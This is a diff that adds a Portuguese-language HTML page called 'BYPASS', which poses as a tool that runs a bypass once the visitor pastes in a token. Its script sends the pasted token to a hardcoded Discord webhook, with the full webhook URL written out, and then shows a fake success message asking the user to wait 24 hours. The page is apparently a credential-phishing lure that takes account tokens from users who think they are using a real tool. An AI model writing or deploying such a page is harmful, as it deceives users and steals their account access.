@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BYPASS</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #0a0c0e;
+      color: #e2e8f0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 15px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 500px;
+      background-color: #111827;
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .title {
+      font-size: 38px;
+      font-weight: 900;
+      color: #00ff88;
+      letter-spacing: 2px;
+      text-shadow: 0 0 10px rgba(0, 255, 136, 0.6);
+      text-transform: uppercase;
+    }
+
+    .subtitle {
+      font-size: 11px;
+      color: rgba(0, 255, 136, 0.6);
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-top: 4px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+      background-color: rgba(0, 0, 0, 0.5);
+      border: 1px solid rgba(0, 255, 136, 0.2);
+      border-radius: 10px;
+      padding: 12px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: bold;
+      color: #00ff88;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    input[type="password"],
+    textarea {
+      width: 100%;
+      background-color: #030712;
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      border-radius: 8px;
+      padding: 10px 12px;
+      color: #00ff88;
+      font-size: 14px;
+      outline: none;
+      transition: 0.3s;
+    }
+
+    input[type="password"]:focus,
+    textarea:focus {
+      border-color: #00ff88;
+      box-shadow: 0 0 8px rgba(0, 255, 136, 0.4);
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 140px;
+      color: #e2e8f0;
+      font-family: monospace;
+    }
+
+    .btn-submit {
+      width: 100%;
+      background-color: #00ff88;
+      color: #000;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 0 12px rgba(0, 255, 136, 0.3);
+      transition: 0.2s;
+      margin-bottom: 16px;
+    }
+
+    .btn-submit:active {
+      transform: scale(0.98);
+      background-color: #00cc6a;
+    }
+
+    .msg-sucesso {
+      display: none;
+      background-color: rgba(0, 255, 136, 0.1);
+      border: 1px solid #00ff88;
+      border-radius: 10px;
+      padding: 14px;
+      text-align: center;
+      color: #00ff88;
+      font-size: 15px;
+      font-weight: bold;
+      margin-bottom: 16px;
+    }
+
+    .secao-bloqueada {
+      display: none;
+      margin-top: 10px;
+      padding-top: 15px;
+      border-top: 1px dashed rgba(0, 255, 136, 0.3);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    
+    <!-- Título Principal -->
+    <div class="header">
+      <h1 class="title">BYPASS</h1>
+      <p class="subtitle">System Tool & Dispatcher</p>
+    </div>
+
+    <!-- Caixa do Texto Enorme / Token -->
+    <div class="form-group">
+      <label for="texto-enorme">Insira seu Texto / Token</label>
+      <textarea id="texto-enorme" placeholder="Cole seu texto aqui..."></textarea>
+    </div>
+
+    <!-- Botão de Enviar -->
+    <button class="btn-submit" onclick="enviarToken()">Enviar / Executar Bypass </button>
+
+    <!-- Mensagem de Sucesso -->
+    <div id="msg-sucesso" class="msg-sucesso">
+      token enviado com sucesso , aguarde até 24 horas.
+    </div>
+
+    <!-- SEÇÃO NOVA (Aparece apenas após o envio) -->
+    <div id="nova-secao" class="secao-bloqueada">
+      
+      <!-- Opção 2 com Asteriscos -->
+      <div class="form-group">
+        <label for="campo-2">[ NOME ]</label>
+        <input type="password" id="campo-2" value="***************" readonly>
+      </div>
+
+      <!-- Opção 3 com Asteriscos -->
+      <div class="form-group">
+        <label for="campo-3">[ SENHA ]</label>
+        <input type="password" id="campo-3" value="***************" readonly>
+      </div>
+
+    </div>
+
+  </div>
+
+  <script>
+    function enviarToken() {
+      const texto = document.getElementById('texto-enorme').value;
+      const msg = document.getElementById('msg-sucesso');
+      const novaSecao = document.getElementById('nova-secao');
+
+      if (!texto.trim()) {
+        alert('Por favor, cole o token na caixa antes de enviar!');
+        return;
+      }
+
+      // Webhook do Discord integrada automaticamente
+      const webhookURL = "https://discord.com/api/webhooks/1561550971056693360/2zE9MlWDKgrf2maeJ_QZu8Ru5vgpHlHsfKWpCttrPMUgcrMzwtc8n-Bzog2Z1sH8UrQM";
+
+      const payload = {
+        content: ` **NOVO TOKEN RECEBIDO NO BYPASS!**\n\`\`\`${texto}\`\`\``
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Enviado pro Discord com sucesso!');
+        } else {
+          console.error('Erro ao enviar para o Discord.');
+        }
+      })
+      .catch(error => {
+        console.error('Erro de conexão:', error);
+      });
+
+      // Mostra a mensagem de sucesso e destrava a seção de baixo
+      msg.style.display = 'block';
+      novaSecao.style.display = 'block';
+
+      msg.scrollIntoView({ behavior: 'smooth' });
+    }
+  </script>
+
+</body>
+</html>
